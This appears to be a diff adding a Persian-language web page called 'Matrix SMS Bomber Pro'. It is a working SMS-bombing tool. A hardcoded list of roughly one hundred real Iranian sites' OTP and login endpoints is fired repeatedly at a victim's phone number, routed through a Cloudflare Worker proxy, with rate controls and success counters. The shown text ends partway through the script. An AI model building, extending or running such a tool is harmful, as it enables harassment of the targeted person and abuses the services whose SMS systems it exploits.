@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matrix SMS Bomber Pro</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --glass: rgba(20, 20, 30, 0.7);
+            --border: rgba(0, 255, 65, 0.3);
+            --text: #e0ffe0;
+            --accent: #00ff41;
+            --green: #00ff41;
+            --red: #ff3333;
+            --radius: 16px;
+            --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
+            --shadow: 0 0 25px rgba(0,255,65,0.2);
+        }
+        body.light {
+            --bg: #f0f4f0;
+            --glass: rgba(255,255,255,0.6);
+            --border: rgba(0,100,0,0.2);
+            --text: #0a0a0a;
+            --accent: #0a0;
+            --green: #0a0;
+            --red: #c00;
+            --shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            transition: 0.3s;
+        }
+        #matrixCanvas {
+            position: fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            z-index:0;
+            opacity:0.3;
+            pointer-events: none;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 960px;
+            margin: auto;
+            padding: 20px;
+        }
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: var(--accent);
+            text-shadow: 0 0 10px var(--accent);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .theme-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 2;
+            background: var(--glass);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 1rem;
+            transition: 0.3s;
+            outline: none;
+        }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 15px var(--accent); }
+        button {
+            padding: 12px 25px;
+            border-radius: 30px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 5px;
+        }
+        .btn-start { background: var(--green); color: #000; box-shadow: 0 0 20px var(--green); }
+        .btn-start:hover { transform: scale(1.05); }
+        .btn-stop { background: var(--red); color: #fff; box-shadow: 0 0 20px var(--red); }
+        .btn-stop:hover { transform: scale(1.05); }
+        .stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: space-around;
+        }
+        .stat-box {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 10px 15px;
+            text-align: center;
+            flex:1;
+            min-width:70px;
+            backdrop-filter: blur(5px);
+        }
+        .stat-label { font-size:0.8rem; opacity:0.8; }
+        .stat-value { font-size:1.5rem; font-weight:bold; }
+        .progress-outer {
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-inner {
+            height: 100%;
+            width: 0%;
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+            transition: width 0.3s;
+        }
+        .log-box {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px;
+            height: 220px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            backdrop-filter: blur(5px);
+        }
+        .flex-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        /* سوئیچ پروکسی */
+        .proxy-toggle { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
+    </style>
+</head>
+<body class="dark">
+    <canvas id="matrixCanvas"></canvas>
+    <button class="theme-btn" onclick="toggleTheme()">🌓 تغییر تم</button>
+
+    <div class="container">
+        <h1>🕶️ Matrix SMS Bomber Pro</h1>
+
+        <div class="glass-card">
+            <div class="grid-2">
+                <div>
+                    <label>📞 شماره موبایل</label>
+                    <input type="text" id="phone" placeholder="09xxxxxxxxx">
+                </div>
+                <div>
+                    <label>⚡ نرخ ارسال (req/s)</label>
+                    <input type="range" id="rateSlider" min="1" max="20" value="5" oninput="document.getElementById('rateVal').innerText=this.value">
+                    <span id="rateVal">5</span> req/s
+                </div>
+                <div>
+                    <label>🎯 پیامک موفق هدف (اختیاری)</label>
+                    <input type="number" id="target" placeholder="مثلاً 100">
+                </div>
+                <div>
+                    <label>🌐 آدرس پروکسی (Cloudflare Worker)</label>
+                    <div class="proxy-toggle">
+                        <input type="checkbox" id="useProxy" checked>
+                        <label for="useProxy">فعال</label>
+                    </div>
+                    <input type="text" id="proxyUrl" placeholder="https://your-worker.workers.dev">
+                </div>
+            </div>
+
+            <div class="flex-row">
+                <button class="btn-start" onclick="startAttack()">▶ شروع</button>
+                <button class="btn-stop" onclick="stopAttack()">⏹ توقف</button>
+            </div>
+
+            <div class="stats" style="margin-top:20px;">
+                <div class="stat-box"><div class="stat-label">کل</div><div class="stat-value" id="total">0</div></div>
+                <div class="stat-box"><div class="stat-label" style="color:var(--green)">موفق</div><div class="stat-value" id="success" style="color:var(--green)">0</div></div>
+                <div class="stat-box"><div class="stat-label" style="color:var(--red)">خطا</div><div class="stat-value" id="fail" style="color:var(--red)">0</div></div>
+                <div class="stat-box"><div class="stat-label">نرخ</div><div class="stat-value" id="rateDisp">0</div></div>
+                <div class="stat-box"><div class="stat-label">٪ موفقیت</div><div class="stat-value" id="percent">0%</div></div>
+            </div>
+
+            <div class="progress-outer"><div class="progress-inner" id="progressBar"></div></div>
+
+            <div class="log-box" id="log">⏳ آمادهٔ عملیات...</div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== ماتریکس ====================
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = '01АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 40);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // ==================== لیست کامل APIها ====================
+        const API_TEMPLATES = [
+            {"source":"neshan.org","url":"https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9","method":"GET","capacity":10},
+            {"source":"#karnaval.ir","url":"https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create","method":"POST","body":'{"campaignId":"000000000000000000000001","mobile":"0{phone}"}',"capacity":10},
+            {"source":"balad.ir","url":"https://account.api.balad.ir/api/web/auth/login/","method":"POST","body":'{"phone_number":"0{phone}","os_type":"W"}',"capacity":10},
+            {"source":"keylid.com","url":"https://api.accounts.keylid.com/api/auth/v2/users/register/","method":"POST","body":'{"phone_number":"98{phone}","srv":"itunes"}',"capacity":20},
+            {"source":"vmusic.ir","url":"https://api.vmusic.ir/auth/otp/request","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":15},
+            {"source":"nazdikeh.com","url":"https://www.nazdikeh.com/api/customers/login-register","method":"POST","body":'{"step":1,"ReturnUrl":"/","mobile":"0{phone}"}',"capacity":30},
+            {"source":"janebi.com","url":"https://janebi.com/signin","method":"POST","body":'{"user_mobile":"0{phone}","confirm_code":"","popup":1,"signin":1}',"capacity":30},
+            {"source":"mizamon.com","url":"https://mizamon.com/wp-admin/admin-ajax.php","method":"POST","body":'{"login_method":"code","phone_number":"0{phone}","action":"ehraz_sms_otp_phone_verify","ehraz_nonce":"1d51bec07c"}',"capacity":10},
+            {"source":"sepehrcc.com","url":"https://app.sepehrcc.com/newapi/v1/Auth/Register/Mobile/0{phone}","method":"GET","capacity":39},
+            {"source":"70kala.ir","url":"https://70kala.ir/wp-json/pinova/user/authenticate","method":"POST","body":'{"identifier":"0{phone}"}',"capacity":12},
+            {"source":"#mobile140.com","url":"https://eloquent-feistel-xpkrs3vmp6.liara.run/api/send","method":"POST","body":'{"type":"event","payload":{"website":"32e11191-2e9b-41df-80ca-fb209d727569","hostname":"mobile140.com","screen":"1566x364","language":"en-US","url":"/login?view=confirm&mobile=0{phone}&exist=false&redirect=/","referrer":"/login?redirect=/"}}',"capacity":10},
+            {"source":"aloghesti.com","url":"https://api.aloghesti.com/api/v1/initial-user","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":20},
+            {"source":"doozshop.com","url":"https://doozshop.com/wp-admin/admin-ajax.php","method":"POST","body":'{"action":"mobile_login","mobile":"0{phone}","step":"send_code"}',"capacity":22},
+            {"source":"iranmojo.com","url":"https://iranmojo.com/wp-admin/admin-ajax.php","method":"POST","body":'{"recaptcha_token":null,"phone":"09377972212","controller":"auth-register_phone","action":"iranmojo_guest","dev":2024}',"capacity":32},
+            {"source":"#19kala.com","url":"https://www.19kala.com/users/register","method":"POST","body":'{"mobile":"0{phone}","password":"12345678e","agree":1}',"capacity":17},
+            {"source":"#abadis.ir","url":"https://abadis.ir/user/ajaxcmd/registernew/","method":"POST","body":'{"loginID":"0{phone}"}',"capacity":10},
+            {"source":"#alibaba.ir","url":"https://ws.alibaba.ir/api/v3/account/mobile/otp","method":"POST","body":'{"phoneNumber":"{phone}"}',"capacity":8},
+            {"source":"#anardoni.com","url":"https://api.anardoni.com/api/v2/auth/v2/send_code","method":"POST","body":'{"mobile":"0{phone}","verify_code_type":"login"}',"capacity":10},
+            {"source":"#anten.ir","url":"https://api2.anten.ir/ids/api/auth/register","method":"POST","body":'{"phone":"0{phone}"}',"capacity":20},
+            {"source":"#azki.com","url":"https://www.azki.com/api/core/v2/app/auth/check-login-availability/","method":"POST","body":'{"phoneNumber":"0{phone}","origin":"www.azki.com"}',"capacity":0},
+            {"source":"#banimode.com","url":"https://mobapi.banimode.com/api/v2/auth/request","method":"POST","body":'{"phone":"0{phone}"}',"capacity":20},
+            {"source":"#boghrat.com","url":"https://admapi.boghrat.com/boghratsite/Account/RegisterOTP","method":"POST","body":'{"Phonenumber":"0{phone}","recaptcha":null,"AppointmentCode":""}',"capacity":20},
+            {"source":"#dastyar.io","url":"https://api.dastyar.io/express/subscription/sendSms","method":"POST","body":'{"phoneNumber":"0{phone}"}',"capacity":0},
+            {"source":"#delino.com","url":"https://www.delino.com/User/PreRegister","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":20},
+            {"source":"#ebpnovin.com","url":"https://www.ebpnovin.com/index.php?route=users/login","method":"POST","body":'{"username":"0{phone}"}',"capacity":0},
+            {"source":"#esam.ir","url":"https://api.esam.ir/api/account/v3/RegisterUserv3","method":"POST","body":'{"mobile":"0{phone}","present_type":"WebApp","registration_method":0,"serialNumber":""}',"capacity":20},
+            {"source":"#files.ir","url":"https://my.files.ir/api/v1/mobile/sms/forgot-password/send","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":0},
+            {"source":"#flytoday.ir","url":"https://www.flytoday.ir/api/collect","method":"POST","body":'{"plaintext":"+98{phone}"}',"capacity":20},
+            {"source":"#hiss.ir","url":"https://hiss.ir/bakala/ajax/send_code/","method":"POST","body":'{"action":"bakala_send_code","phone_email":"0{phone}"}',"capacity":0},
+            {"source":"#iranconcert.com","url":"https://www.iranconcert.com/user/check","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":0},
+            {"source":"#iranecar.ir","url":"https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo","method":"POST","body":'{"emailOrNumber":"0{phone}","userType":"siteUser"}',"capacity":0},
+            {"source":"#itoll.com","url":"https://app.itoll.com/api/v1/auth/login","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":0},
+            {"source":"#kanape.ir","url":"https://api.kanape.ir/v4/auth/otp","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":9},
+            {"source":"#lastsecond.ir","url":"https://api.lastsecond.ir/auth/register/token","method":"POST","body":'{"firstName":"\u00da\u2020","lastName":"\u00d9\u201a","username":"0{phone}","referralCode":"","termsAndConditions":true}',"capacity":1},
+            {"source":"#lenz.ir","url":"https://api-v3.lenz.ir/api/v3/user-management/otp/register","method":"POST","body":'{"msisdn":"98{phone}"}',"capacity":1},
+            {"source":"#malltina.com","url":"https://api.malltina.com/api/v2/check-user","method":"POST","body":'{"user":"0{phone}"}',"capacity":20},
+            {"source":"#mizito.ir","url":"https://app.mizito.ir/capi/session/register","method":"POST","body":'{"step":1,"activate_method":"sms","email":"","phone":"0{phone}","username":"0{phone}","pin_code":"","firstname":"","lastname":"","workspace_name":"","password":"","repassword":"","teammates":[{"name":"","email_phone":""}],"validated":false}',"capacity":20},
+            {"source":"#netbarg.com","url":"https://netbarg.com/tehran/users/loginByMobile/","method":"POST","body":'{"_method":"POST","phone":"0{phone}"}',"capacity":20},
+            {"source":"#okcs.com","url":"https://okcs.com/users/mobilelogin","method":"POST","body":'{"mobile":"0{phone}","url":"https://okcs.com/"}',"capacity":0},
+            {"source":"#ravandarman.com","url":"https://papi.ravandarman.com/register/fast","method":"POST","body":'{"firstName":"f","lastName":"q","gender":0,"registerField":"tel","termsAndConditions":true,"tel":"0{phone}"}',"capacity":1},
+            {"source":"#sheypoor.com","url":"https://www.sheypoor.com/api/v10.0.0/auth/send","method":"POST","body":'{"username":"0{phone}"}',"capacity":0},
+            {"source":"#simcart.com","url":"https://simcart.com/api/v1/users/login-v2/login-type/","method":"POST","body":'{"phone":"0{phone}"}',"capacity":3},
+            {"source":"abantether.com","url":"https://api.abantether.com/api/v2/auths/register/phone/send","method":"POST","body":'{"phone_number":"0{phone}"}',"capacity":1},
+            {"source":"abrehamrahi.ir","url":"https://abrehamrahi.ir/api/v6/profile/auth/generate-code/","method":"POST","body":'{"phone":"{phone}","prefix":"+98"}',"capacity":2},
+            {"source":"achareh.co","url":"https://api.achareh.co/v2/accounts/login/?web=true","method":"POST","body":'{"phone":"+98{phone}","context":"general"}',"capacity":4},
+            {"source":"andarz.io","url":"https://api.andarz.io/api/v2/auth/signup/otp/","method":"POST","body":'{"phone_number":"0{phone}"}',"capacity":5},
+            {"source":"axon.me","url":"https://axon.me/services/api/identity-service/v1/users/register-login/phr","method":"POST","body":'{"phoneNumber":"0{phone}","serviceName":"AXON","needTag":true,"sendAudioOtp":false}',"capacity":3},
+            {"source":"balad.ir","url":"https://account.api.balad.ir/api/web/auth/login/","method":"POST","body":'{"phone_number":"0{phone}","os_type":"W"}',"capacity":1},
+            {"source":"basalam.com","url":"https://services.basalam.com/web/v1/auth/captcha/otp-request","method":"POST","body":'{"mobile":"0{phone}","client_id":"11","login_by_backup_mobile":false}',"capacity":5},
+            {"source":"bertina.ir","url":"https://llm.bertina.ir/api/auth/send-otp","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":1},
+            {"source":"bimebazar.com","url":"https://bimebazar.com/accounts/api/login_sec/","method":"POST","body":'{"username":"0{phone}","type":"sms"}',"capacity":7},
+            {"source":"bitpin.ir","url":"https://api-sejel.bitpin.ir/v1/usr/auth/authentication/","method":"POST","body":'{"password":"12345678e","resend":false,"use_voice_call":false,"phone":"0{phone}","device_type":"web"}',"capacity":20},
+            {"source":"boofai.com","url":"https://heimdall.boofai.com/api/v1/otp/send","method":"POST","body":'{"cellphone":"+98{phone}"}',"capacity":250},
+            {"source":"booking.ir","url":"https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/","method":"POST","body":'{"mobile":"{phone}","countryCode":"ir"}',"capacity":5},
+            {"source":"cafebazaar.ir","url":"https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest","method":"POST","body":'{"properties":{"language":2,"clientID":"ejzbxi83legfl7xgp32qxq4ye4g38oyf","deviceID":"ejzbxi83legfl7xgp32qxq4ye4g38oyf","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98{phone}"}}}',"capacity":15},
+            {"source":"digikala.com","url":"https://api.digikala.com/v1/user/authenticate/","method":"POST","body":'{"backUrl":"/","username":"0{phone}","otp_call":false,"hash":null}',"capacity":1},
+            {"source":"divar.ir","url":"https://api.divar.ir/v5/auth/authenticate","method":"POST","body":'{"phone":"0{phone}"}',"capacity":15},
+            {"source":"drnext.ir","url":"https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token","method":"POST","body":'{"source":"besina","mobile":"0{phone}","key":"U2FsdGVkX1+zCbHc0CmLAG4ebLlQNqHSophwTnPEM0FoXqoRPoDTw++WvlGiPsxHCr4zVSSWjJjbvbep14CVNA=="}',"capacity":4},
+            {"source":"drsaina.com","url":"https://www.drsaina.com/api/v2/authentication/request-totp","method":"POST","body":'{"phoneNumber":"0{phone}"}',"capacity":10},
+            {"source":"elanza.com","url":"https://api.elanza.com/auth/request","method":"POST","body":'{"contact":"0{phone}"}',"capacity":1},
+            {"source":"eligasht.com","url":"https://api2.eligasht.com/api/account/register","method":"POST","body":'{"userName":"0{phone}","recaptchaToken":null}',"capacity":10},
+            {"source":"eseminar.tv","url":"https://api.eseminar.tv/api/v1/auth/otp/send","method":"POST","body":'{"method":"register","mobile":"0{phone}"}',"capacity":5},
+            {"source":"faradars.org","url":"https://api.faradars.org/api/client/v1/auth/otp","method":"POST","body":'{"mobile":"0{phone}","digits":5,"platforms":"web","source":"faradars","recaptcha_token":""}',"capacity":1},
+            {"source":"fidibo.com","url":"https://api.fidibo.com/identity/login/prepare","method":"POST","body":'{"username":"98-{phone}"}',"capacity":2},
+            {"source":"footballi.net","url":"https://api.footballi.net/api/v2/user/check","method":"POST","body":'{"login":"0{phone}","country_code":"+98"}',"capacity":3},
+            {"source":"gapfilm.ir","url":"https://core.gapfilm.ir/api/v3.2/Account/Login","method":"POST","body":'{"Method":1,"PhoneNo":"{phone}"}',"capacity":3},
+            {"source":"gisheh7.ir","url":"https://gateway.gisheh7.ir/user/v1/public/auth/otp/generate","method":"POST","body":'{"phone":"0{phone}"}',"capacity":20},
+            {"source":"gsm.ir","url":"https://marketplace.gsm.ir/api/v1/user/login/","method":"POST","body":'{"phone_number":"+98{phone}"}',"capacity":2},
+            {"source":"haal.ir","url":"https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist","method":"POST","body":'{"Mobile":"0{phone}"}',"capacity":20},
+            {"source":"hamyarwp.com","url":"https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081","method":"POST","body":'{"username":"0{phone}"}',"capacity":250},
+            {"source":"metisai.ir","url":"https://api.metisai.ir/api/v1/client/phone-verification/request-otp","method":"POST","body":'{"phoneNumber":"0{phone}"}',"capacity":39},
+            {"source":"mrbilit.ir","url":"https://content.mrbilit.ir/sms/get_app/send?to=0{phone}","method":"POST","capacity":20},
+            {"source":"mrbilit2.ir","url":"https://auth.mrbilit.ir/api/Token/send?mobile=0{phone}","method":"GET","capacity":1},
+            {"source":"namava.ir","url":"https://www.namava.ir/api/v1.0/accounts/login/by-otp/request","method":"POST","body":'{"UserName":"+98{phone}"}',"capacity":10},
+            {"source":"niazerooz.com","url":"https://my.niazerooz.com/api/account/requestotp","method":"POST","body":'{"mobile":"0{phone}","registerReturnUrl":""}',"capacity":10},
+            {"source":"nobat.ir","url":"https://api.nobat.ir/patient/login/phone","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":1},
+            {"source":"okala.com","url":"https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister","method":"POST","body":'{"mobile":"0{phone}","deviceTypeCode":10,"confirmTerms":true,"notRobot":false,"otpType":0,"ValidationCodeCreateReason":5,"OtpApp":0,"IsAppOnly":false}',"capacity":20},
+            {"source":"okian.ai","url":"https://okian.ai/api/auth/submit-phone-number","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":1},
+            {"source":"pezeshket.com","url":"https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2","method":"POST","body":'{"mobileNumber":"0{phone}"}',"capacity":5},
+            {"source":"quera.org","url":"https://quera.org/accounts/api/register/phone/otp","method":"POST","body":'{"phone_number":"{phone}","country_code":"+98","captcha_token":""}',"capacity":10},
+            {"source":"rhino.ir","url":"https://rhino-api.smartbytes.ir/auth/send-otp","method":"POST","body":'{"phone_number":"0{phone}"}',"capacity":3},
+            {"source":"ring.ir","url":"https://ring.ir/api/v1/auth/otp","method":"POST","body":'{"mobile":"+98{phone}"}',"capacity":20},
+            {"source":"roboo.ir","url":"https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0{phone}&code=1302817798429812","method":"POST","capacity":20},
+            {"source":"salamati24.com","url":"https://www.salamati24.com/api/activationcode?mobile=0{phone}&as_register=1&roleId=-2","method":"GET","capacity":20},
+            {"source":"sanjagh.pro","url":"https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell","method":"POST","body":'{"cell":"0{phone}"}',"capacity":1},
+            {"source":"sibche.com","url":"https://api.sibche.com/profile/sendCode","method":"POST","body":'{"mobile":"0{phone}","spec-g":null,"g-recaptcha-response":"null"}',"capacity":3},
+            {"source":"skyroom.online","url":"https://www.skyroom.online/auth/api/authenticate","method":"POST","body":'{"mobile_number":"0{phone}","country_code":"98"}',"capacity":10},
+            {"source":"tabdeal.org","url":"https://api-web.tabdeal.org/register/","method":"POST","body":'{"phone_or_email":"0{phone}"}',"capacity":3},
+            {"source":"takhfifan.com","url":"https://takhfifan.com/v6/api/magento/login/init","method":"POST","body":'{"username":"0{phone}"}',"capacity":1},
+            {"source":"talasea.ir","url":"https://api.talasea.ir/api/auth/sentOTP","method":"POST","body":'{"phoneNumber":"0{phone}"}',"capacity":4},
+            {"source":"tapsi.ir","url":"https://api.tapsi.ir/api/v2.2/user","method":"POST","body":'{"credential":{"phoneNumber":"0{phone}","role":"DRIVER"},"otpOption":"SMS"}',"capacity":10},
+            {"source":"telewebion.ir","url":"https://gateway.telewebion.ir/shenaseh/api/v2/auth/step-one","method":"POST","body":'{"phone":"{phone}","code":"98","smsStatus":"1","notification_method":"sms"}',"capacity":1},
+            {"source":"tetherland.com","url":"https://service.tetherland.com/api/v5/login-register","method":"POST","body":'{"mobile":"0{phone}","device_info":{"brand":"","model":"","browserVersion":"147.0","app_version":"","by":"web","osName":"Windows","osVersion":"11","browserName":"Firefox","platform":"web","name":"Windows","device":"web"},"otp_type":"sms","device":"web"}',"capacity":1},
+            {"source":"torob.com","url":"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}&source=next_desktop&_landing_page=home","method":"GET","capacity":1},
+            {"source":"tosinso.com","url":"https://tosinso.com/api/auth/send-code","method":"POST","body":'{"type":"mobile","value":"{phone}","countryCode":"+98"}',"capacity":5},
+            {"source":"uploadkon.ir","url":"https://uploadkon.ir/ucp.php?go=sendotp","method":"POST","body":'{"phone":"0{phone}"}',"capacity":250},
+            {"source":"virgool.io","url":"https://virgool.io/api2/app/auth/verify","method":"POST","body":'{"identifier":"+98{phone}","method":"phone","type":"register"}',"capacity":3},
+            {"source":"vmusic.ir","url":"https://api.vmusic.ir/auth/otp/request","method":"POST","body":'{"mobile":"0{phone}"}',"capacity":1},
+            {"source":"wisgoon.com","url":"https://gateway.wisgoon.com/api/v8/auth/login/","method":"POST","body":'{"phone":"+98{phone}","token":"e622c330c77a17c8426e638d7a85da6c2ec9f455"}',"capacity":1},
+            {"source":"yarai.ir","url":"https://chat.yarai.ir/api/v1/otps/request-otp","method":"POST","body":'{"phone":"0{phone}","isAndroid":false}',"capacity":20},
+            {"source":"zap-express.com","url":"https://api.zap-express.com/fr/Registration/SendVerificationCode","method":"POST","body":'{"mobile":"0{phone}","registrationCategoryId":1,"representativeCode":"","utmInfo":{"utM_Source":"alopeyk","utM_Medium":"online","utM_Campaign":"site","utM_Content":"","utM_Term":""}}',"capacity":1},
+            {"source":"zigap.ir","url":"https://gateway.zigap.ir/api/v1.9/authenticate/sendotp","method":"POST","body":'{"phoneNumber":"+98{phone}"}',"capacity":20}
+        ];
+
+        // ==================== متغیرها ====================
+        let stats = { total: 0, success: 0, fail: 0 };
+        let stopFlag = false;
+        let startTime = 0;
+        const logBox = document.getElementById('log');
+        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev'; // ← جایگزین کنید
+        document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
+
+        function log(msg) {
+            const time = new Date().toLocaleTimeString('fa-IR');
+            logBox.innerHTML += `[${time}] ${msg}\n`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        function updateStats() {
+            document.getElementById('total').innerText = stats.total;
+            document.getElementById('success').innerText = stats.success;
+            document.getElementById('fail').innerText = stats.fail;
+            const elapsed = (Date.now() - startTime) / 1000;
+            const rate = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
+            document.getElementById('rateDisp').innerText = rate;
+            const percent = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
+            document.getElementById('percent').innerText = percent + '%';
+        }
+
+        async function sendViaProxy(api, phone, proxyUrl) {
+            const url = api.url.replace('{phone}', phone);
+            const method = api.method || 'GET';
+            let body = api.body ? api.body.replace('{phone}', phone) : null;
+            const headers = { 'Content-Type': 'application/json' };
+            const resp = await fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url, method, headers, body })
+            });
+            if (resp.ok) {
+                const data = await resp.json().catch(() => ({}));
+                if (data.error || (data.message && /failed|error/i.test(data.message))) return false;
+                return true;
+            }
+            return false;
+        }
+
+        class TokenBucket {
+            constructor(rate) {
+                this.rate = rate;
+                this.tokens = 0;
+                this.lastTime = Date.now();
+            }
+            async consume() {
+                const now = Date.now();
+                this.tokens += ((now - this.lastTime) / 1000) * this.rate;
+                this.lastTime = now;
+                if (this.tokens > this.rate) this.tokens = this.rate;
+                if (this.tokens >= 1) {
+                    this.tokens -= 1;
+                } else {
+                    const wait = ((1 - this.tokens) / this.rate) * 1000;
+                    await new Promise(r => setTimeout(r, wait));
+                    this.tokens = 0;
+                    this.lastTime = Date.now();
+                }
+            }
+        }
+
+        async function runAttack(phone, rate, target, proxyUrl) {
+            const bucket = new TokenBucket(rate);
+            const tasks = [];
+            for (const api of API_TEMPLATES) {
+                if (stopFlag) break;
+                const capacity = api.capacity || 0;
+                if (capacity <= 0) continue;
+                for (let i = 0; i < capacity; i++) {
+                    if (stopFlag) break;
+                    tasks.push(api);
+                }
+            }
+            log(`📋 ${tasks.length} درخواست آماده شد.`);
+            for (const api of tasks) {
+                if (stopFlag || (target && stats.success >= target)) break;
+                await bucket.consume();
+                try {
+                    const ok = await sendViaProxy(api, phone, proxyUrl);
+                    stats.total++;
+                    if (ok) {
+                        stats.success++;
+                        if (stats.success % 10 === 0) log(`✅ موفق از ${api.source}`);
+                    } else {
+                        stats.fail++;
+                        if (stats.fail % 10 === 0) log(`❌ خطا از ${api.source}`);
+                    }
+                    updateStats();
+                    const progress = target ? (stats.success / target * 100) : (stats.total / tasks.length * 100);
+                    document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
+                } catch (e) {
+                    stats.total++;
+                    stats.fail++;
+                    updateStats();
+                }
+                if (target && stats.success >= target) {
+                    log(`🎯 به هدف ${target} رسیدیم. توقف...`);
+                    break;
+                }
+            }
+            log(`🏁 پایان. مجموع: ${stats.total} | موفق: ${stats.success} | خطا: ${stats.fail}`);
+            document.getElementById('progressBar').style.width = '100%';
+            resetButtons();
+        }
+
+        function startAttack() {
+            const phone = document.getElementById('phone').value.trim();
+            if (!/^09\d{9}$/.test(phone)) { alert('شماره موبایل معتبر نیست'); return; }
+            const rate = parseInt(document.getElementById('rateSlider').value);
+            const targetStr = document.getElementById('target').value.trim();
+            const target = targetStr ? parseInt(targetStr) : null;
+            const useProxy = document.getElementById('useProxy').checked;
+            const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
+            if (useProxy && !proxyUrl) { alert('آدرس پروکسی را وارد کنید'); return; }
+            localStorage.setItem('proxyUrl', proxyUrl);
+            stats = { total:0, success:0, fail:0 };
+            stopFlag = false;
+            startTime = Date.now();
+            updateStats();
+            logBox.innerHTML = '';
+            log(`🚀 شروع ارسال به ${phone} با نرخ ${rate} req/s...`);
+            document.getElementById('progressBar').style.width = '0%';
+            document.querySelector('.btn-start').disabled = true;
+            document.querySelector('.btn-stop').disabled = false;
+            runAttack(phone, rate, target, proxyUrl);
+        }
+
